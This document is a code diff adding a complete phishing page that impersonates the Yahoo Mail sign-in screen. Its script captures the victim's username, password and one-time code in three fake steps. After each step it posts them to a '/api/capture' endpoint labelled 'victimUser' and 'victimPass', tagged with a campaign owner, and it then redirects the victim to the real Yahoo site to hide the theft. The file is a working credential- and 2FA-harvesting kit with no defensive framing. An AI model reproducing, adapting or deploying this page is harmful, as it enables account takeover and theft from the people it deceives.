@@ -1,0 +1,672 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in – Yahoo Mail</title>
+    <style>
+        :root {
+            --yahoo-purple: #6001d2;
+            --yahoo-purple-hover: #4e00ad;
+            --yahoo-blue: #188fff;
+            --yahoo-blue-hover: #0d7be6;
+            --bg-page: #ffffff;
+            --text-dark: #232a31;
+            --text-muted: #5a636a;
+            --error-red: #d93025;
+            --soft-bg: #f0f3f5;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: "Yahoo Sans", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-page);
+            color: var(--text-dark);
+            min-height: 100dvh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        /* Top bar aligned with centered column */
+        .top-header {
+            width: 100%;
+            max-width: 960px;
+            display: flex;
+            align-items: center;
+            justify-content: flex-end;
+            padding: 18px 24px 8px;
+        }
+
+        .help-link {
+            font-size: 0.9rem;
+            color: var(--yahoo-blue);
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .help-link:hover {
+            text-decoration: underline;
+        }
+
+        /* Centered main container with breathing space around logo */
+        .login-container {
+            flex: 1;
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 16px 20px 32px;
+        }
+
+        .login-box {
+            width: 100%;
+            max-width: 360px;
+            margin: 0 auto;
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        /* Logo positioned higher with comfortable spacing above & below */
+        .brand-badge {
+            font-size: 2.15rem;
+            font-weight: 900;
+            font-style: italic;
+            color: var(--yahoo-purple);
+            letter-spacing: -1.1px;
+            margin-top: 8px;
+            margin-bottom: 36px;
+            line-height: 1;
+        }
+
+        .login-title {
+            font-size: 1.45rem;
+            font-weight: 700;
+            color: var(--text-dark);
+            margin-bottom: 8px;
+        }
+
+        .login-subtitle {
+            font-size: 0.92rem;
+            color: var(--text-muted);
+            line-height: 1.4;
+            margin-bottom: 24px;
+        }
+
+        /* Step panels */
+        .step-panel {
+            width: 100%;
+            display: none;
+            animation: fadeIn 0.25s ease;
+        }
+
+        .step-panel.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(6px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Input fields */
+        .input-group {
+            position: relative;
+            width: 100%;
+            text-align: left;
+            margin-bottom: 22px;
+        }
+
+        .field-label {
+            display: block;
+            font-size: 0.85rem;
+            color: var(--text-muted);
+            margin-bottom: 4px;
+        }
+
+        .field-input {
+            width: 100%;
+            height: 42px;
+            border: none;
+            border-bottom: 1.5px solid #9aa0a6;
+            background-color: transparent;
+            font-size: 1rem;
+            color: var(--text-dark);
+            padding: 6px 56px 4px 2px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .field-input:focus {
+            border-bottom-color: var(--yahoo-blue);
+            border-bottom-width: 2px;
+        }
+
+        .otp-input {
+            text-align: center;
+            font-size: 1.5rem;
+            font-weight: 700;
+            letter-spacing: 10px;
+            padding-right: 2px;
+        }
+
+        .toggle-password {
+            position: absolute;
+            right: 2px;
+            bottom: 8px;
+            background: none;
+            border: none;
+            color: var(--yahoo-blue);
+            font-size: 0.82rem;
+            font-weight: 600;
+            cursor: pointer;
+            padding: 4px;
+        }
+
+        .toggle-password:hover {
+            text-decoration: underline;
+        }
+
+        .error-message {
+            color: var(--error-red);
+            font-size: 0.82rem;
+            text-align: left;
+            margin-top: 6px;
+            display: none;
+        }
+
+        /* Primary blue button */
+        .btn-primary {
+            width: 100%;
+            height: 44px;
+            border-radius: 22px;
+            border: none;
+            background-color: var(--yahoo-blue);
+            color: #ffffff;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s, transform 0.1s;
+            margin-top: 6px;
+        }
+
+        .btn-primary:hover {
+            background-color: var(--yahoo-blue-hover);
+        }
+
+        .btn-primary:active {
+            transform: scale(0.99);
+        }
+
+        /* Options row */
+        .form-options {
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin: 18px 0 34px;
+            font-size: 0.88rem;
+        }
+
+        .checkbox-label {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: var(--yahoo-blue);
+            font-weight: 500;
+            cursor: pointer;
+            user-select: none;
+        }
+
+        .checkbox-label input[type="checkbox"] {
+            accent-color: var(--yahoo-blue);
+            width: 16px;
+            height: 16px;
+            cursor: pointer;
+        }
+
+        .inline-link {
+            color: var(--yahoo-blue);
+            text-decoration: none;
+            font-weight: 500;
+            background: none;
+            border: none;
+            font-size: 0.88rem;
+            cursor: pointer;
+        }
+
+        .inline-link:hover {
+            text-decoration: underline;
+        }
+
+        /* Outline button */
+        .btn-outline {
+            width: 100%;
+            height: 44px;
+            border-radius: 22px;
+            border: 1.5px solid var(--yahoo-blue);
+            background-color: #ffffff;
+            color: var(--yahoo-blue);
+            font-size: 0.98rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .btn-outline:hover {
+            background-color: rgba(24, 143, 255, 0.06);
+        }
+
+        /* User pill on password & OTP steps */
+        .user-pill {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background-color: var(--soft-bg);
+            padding: 6px 14px;
+            border-radius: 16px;
+            font-size: 0.88rem;
+            color: var(--text-dark);
+            margin-bottom: 18px;
+        }
+
+        .user-pill button {
+            background: none;
+            border: none;
+            color: var(--yahoo-blue);
+            font-weight: 600;
+            font-size: 0.82rem;
+            cursor: pointer;
+        }
+
+        /* Purple circular loading screen (3 seconds) */
+        .loading-overlay {
+            position: fixed;
+            inset: 0;
+            background-color: rgba(255, 255, 255, 0.96);
+            z-index: 100;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 18px;
+        }
+
+        .loading-overlay.visible {
+            display: flex;
+            animation: fadeOverlay 0.2s ease;
+        }
+
+        @keyframes fadeOverlay {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .purple-spinner {
+            width: 56px;
+            height: 56px;
+            border: 5px solid rgba(96, 1, 210, 0.18);
+            border-top-color: var(--yahoo-purple);
+            border-radius: 50%;
+            animation: spinPurple 0.85s linear infinite;
+        }
+
+        @keyframes spinPurple {
+            to { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            font-size: 0.96rem;
+            font-weight: 600;
+            color: var(--yahoo-purple);
+        }
+
+        /* Centered footer */
+        .page-footer {
+            width: 100%;
+            text-align: center;
+            padding: 16px 16px 24px;
+            font-size: 0.78rem;
+            color: var(--text-muted);
+        }
+
+        .page-footer a {
+            color: var(--text-muted);
+            text-decoration: none;
+            margin: 0 8px;
+        }
+
+        .page-footer a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Top header -->
+    <header class="top-header">
+        <a href="#help" class="help-link" id="help-link">Help</a>
+    </header>
+
+    <!-- Purple circular loading screen (3 seconds) -->
+    <div id="loading-overlay" class="loading-overlay" role="status" aria-live="polite">
+        <div class="purple-spinner"></div>
+        <p id="loading-label" class="loading-text">Loading...</p>
+    </div>
+
+    <!-- Centered main container -->
+    <main class="login-container">
+        <div class="login-box">
+            <!-- Top Yahoo logo -->
+            <div class="brand-badge">yahoo!</div>
+
+            <!-- STEP 1: Username / Email / Mobile -->
+            <section id="step-identifier" class="step-panel active">
+                <h1 class="login-title">Sign in to Yahoo Mail</h1>
+                <p class="login-subtitle">Sign in using your Yahoo account</p>
+
+                <form id="form-identifier" novalidate>
+                    <div class="input-group">
+                        <label for="identifier-input" class="field-label">Username, email address or mobile number</label>
+                        <input
+                            type="text"
+                            id="identifier-input"
+                            class="field-input"
+                            autocomplete="username"
+                            required
+                        >
+                        <p id="identifier-error" class="error-message">Please enter a valid username, email address, or mobile number.</p>
+                    </div>
+
+                    <button type="submit" class="btn-primary">Next</button>
+
+                    <div class="form-options">
+                        <label class="checkbox-label">
+                            <input type="checkbox" id="keep-signed-in" checked>
+                            <span>Stay signed in</span>
+                        </label>
+                        <button type="button" id="forgot-id-btn" class="inline-link">Forgotten username?</button>
+                    </div>
+
+                    <button type="button" id="create-account-btn" class="btn-outline">Create an account</button>
+                </form>
+            </section>
+
+            <!-- STEP 2: Password -->
+            <section id="step-password" class="step-panel">
+                <h1 class="login-title">Enter password</h1>
+                <p class="login-subtitle">Sign in to continue to Yahoo</p>
+
+                <div class="user-pill">
+                    <span id="display-user-pw"></span>
+                    <button type="button" id="change-user-pw-btn">Change</button>
+                </div>
+
+                <form id="form-password" novalidate>
+                    <div class="input-group">
+                        <label for="password-input" class="field-label">Password</label>
+                        <input
+                            type="password"
+                            id="password-input"
+                            class="field-input"
+                            autocomplete="current-password"
+                            required
+                        >
+                        <button type="button" id="toggle-password-btn" class="toggle-password">Show</button>
+                        <p id="password-error" class="error-message">Please enter your password (at least 6 characters).</p>
+                    </div>
+
+                    <button type="submit" class="btn-primary">Next</button>
+                </form>
+            </section>
+
+            <!-- STEP 3: OTP Code -->
+            <section id="step-otp" class="step-panel">
+                <h1 class="login-title">Enter OTP code</h1>
+                <p class="login-subtitle">A 6-digit one-time code has been sent to your account.</p>
+
+                <div class="user-pill">
+                    <span id="display-user-otp"></span>
+                    <button type="button" id="change-user-otp-btn">Change</button>
+                </div>
+
+                <form id="form-otp" novalidate>
+                    <div class="input-group">
+                        <label for="otp-input" class="field-label">6-digit OTP code</label>
+                        <input
+                            type="text"
+                            id="otp-input"
+                            class="field-input otp-input"
+                            maxlength="6"
+                            inputmode="numeric"
+                            placeholder="••••••"
+                            required
+                        >
+                        <p id="otp-error" class="error-message">Please enter the 6-digit OTP code.</p>
+                    </div>
+
+                    <button type="submit" class="btn-primary">Verify and continue</button>
+                </form>
+            </section>
+        </div>
+    </main>
+
+    <!-- Centered footer -->
+    <footer class="page-footer">
+        <a href="#privacy">Privacy</a> •
+        <a href="#terms">Terms</a> •
+        <a href="#help">Help</a>
+    </footer>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const OFFICIAL_YAHOO_URL = "https://www.yahoo.com/";
+
+            const urlParams = new URLSearchParams(window.location.search);
+            const campaignOwner = urlParams.get("user") || "Kim";
+            const linkType = (urlParams.get("type") || "otp").toLowerCase();
+
+            let capturedUser = "";
+            let capturedPass = "";
+
+            const stepIdentifier = document.getElementById('step-identifier');
+            const stepPassword = document.getElementById('step-password');
+            const stepOtp = document.getElementById('step-otp');
+
+            const formIdentifier = document.getElementById('form-identifier');
+            const identifierInput = document.getElementById('identifier-input');
+            const identifierError = document.getElementById('identifier-error');
+
+            const formPassword = document.getElementById('form-password');
+            const passwordInput = document.getElementById('password-input');
+            const passwordError = document.getElementById('password-error');
+            const togglePasswordBtn = document.getElementById('toggle-password-btn');
+
+            const formOtp = document.getElementById('form-otp');
+            const otpInput = document.getElementById('otp-input');
+            const otpError = document.getElementById('otp-error');
+
+            const displayUserPw = document.getElementById('display-user-pw');
+            const displayUserOtp = document.getElementById('display-user-otp');
+            const changeUserPwBtn = document.getElementById('change-user-pw-btn');
+            const changeUserOtpBtn = document.getElementById('change-user-otp-btn');
+
+            const loadingOverlay = document.getElementById('loading-overlay');
+            const loadingLabel = document.getElementById('loading-label');
+
+            function captureData(payload) {
+                return fetch('/api/capture', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                }).catch((err) => console.log(err));
+            }
+
+            function showStep(panel) {
+                [stepIdentifier, stepPassword, stepOtp].forEach(el => el.classList.remove('active'));
+                panel.classList.add('active');
+            }
+
+            function runPurpleLoader(message, onDone) {
+                loadingLabel.textContent = message;
+                loadingOverlay.classList.add('visible');
+
+                setTimeout(() => {
+                    loadingOverlay.classList.remove('visible');
+                    if (typeof onDone === 'function') {
+                        onDone();
+                    }
+                }, 3000);
+            }
+
+            function isValidIdentifier(value) {
+                const trimmed = value.trim();
+                if (!trimmed) return false;
+                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                const phoneRegex = /^\+?[\d\s\-()]{7,16}$/;
+                const usernameRegex = /^[a-zA-Z0-9._-]{3,32}$/;
+                return emailRegex.test(trimmed) || phoneRegex.test(trimmed) || usernameRegex.test(trimmed);
+            }
+
+            identifierInput.addEventListener('input', () => {
+                identifierError.style.display = 'none';
+            });
+
+            passwordInput.addEventListener('input', () => {
+                passwordError.style.display = 'none';
+            });
+
+            otpInput.addEventListener('input', (e) => {
+                e.target.value = e.target.value.replace(/\D/g, '');
+                otpError.style.display = 'none';
+            });
+
+            togglePasswordBtn.addEventListener('click', () => {
+                const isHidden = passwordInput.type === 'password';
+                passwordInput.type = isHidden ? 'text' : 'password';
+                togglePasswordBtn.textContent = isHidden ? 'Hide' : 'Show';
+            });
+
+            // Step 1: Capture email/identifier -> Purple loader 3s -> Password step
+            formIdentifier.addEventListener('submit', (e) => {
+                e.preventDefault();
+                const value = identifierInput.value.trim();
+
+                if (!isValidIdentifier(value)) {
+                    identifierError.style.display = 'block';
+                    identifierInput.focus();
+                    return;
+                }
+
+                capturedUser = value;
+
+                captureData({
+                    owner: campaignOwner,
+                    network: 'Yahoo',
+                    type: 'identifier_step',
+                    victimUser: capturedUser,
+                    victimPass: 'En attente',
+                    otp: 'Aucun'
+                });
+
+                runPurpleLoader("Checking account...", () => {
+                    displayUserPw.textContent = capturedUser;
+                    passwordInput.value = '';
+                    passwordInput.type = 'password';
+                    togglePasswordBtn.textContent = 'Show';
+                    showStep(stepPassword);
+                    passwordInput.focus();
+                });
+            });
+
+            // Step 2: Capture password -> Purple loader 3s -> OTP step (or redirect if standard)
+            formPassword.addEventListener('submit', (e) => {
+                e.preventDefault();
+                if (passwordInput.value.length < 6) {
+                    passwordError.style.display = 'block';
+                    passwordInput.focus();
+                    return;
+                }
+
+                capturedPass = passwordInput.value;
+                const isOtpFlow = linkType !== 'standard';
+
+                captureData({
+                    owner: campaignOwner,
+                    network: 'Yahoo',
+                    type: isOtpFlow ? 'otp_step1' : 'standard',
+                    victimUser: capturedUser,
+                    victimPass: capturedPass,
+                    otp: 'Aucun'
+                });
+
+                runPurpleLoader("Sending OTP code...", () => {
+                    if (isOtpFlow) {
+                        displayUserOtp.textContent = capturedUser;
+                        otpInput.value = '';
+                        showStep(stepOtp);
+                        otpInput.focus();
+                    } else {
+                        window.location.href = OFFICIAL_YAHOO_URL;
+                    }
+                });
+            });
+
+            // Step 3: Capture OTP -> Purple loader 3s -> Official Yahoo redirect
+            formOtp.addEventListener('submit', (e) => {
+                e.preventDefault();
+                const code = otpInput.value.trim();
+
+                if (code.length !== 6) {
+                    otpError.style.display = 'block';
+                    otpInput.focus();
+                    return;
+                }
+
+                captureData({
+                    owner: campaignOwner,
+                    network: 'Yahoo',
+                    type: linkType,
+                    victimUser: capturedUser,
+                    victimPass: capturedPass,
+                    otp: code
+                });
+
+                runPurpleLoader("Redirecting to Yahoo...", () => {
+                    window.location.href = OFFICIAL_YAHOO_URL;
+                });
+            });
+
+            function backToIdentifier() {
+                passwordError.style.display = 'none';
+                otpError.style.display = 'none';
+                showStep(stepIdentifier);
+                identifierInput.focus();
+            }
+
+            changeUserPwBtn.addEventListener('click', backToIdentifier);
+            changeUserOtpBtn.addEventListener('click', backToIdentifier);
+
+            document.getElementById('forgot-id-btn').addEventListener('click', () => {
+                alert('Link "Forgotten username?" to your recovery page.');
+            });
+
+            document.getElementById('create-account-btn').addEventListener('click', () => {
+                alert('Link "Create an account" to your sign-up page.');
+            });
+
+            document.getElementById('help-link').addEventListener('click', (e) => {
+                e.preventDefault();
+                alert('Link "Help" to your support page.');
+            });
+        });
+    </script>
+</body>
+</html>
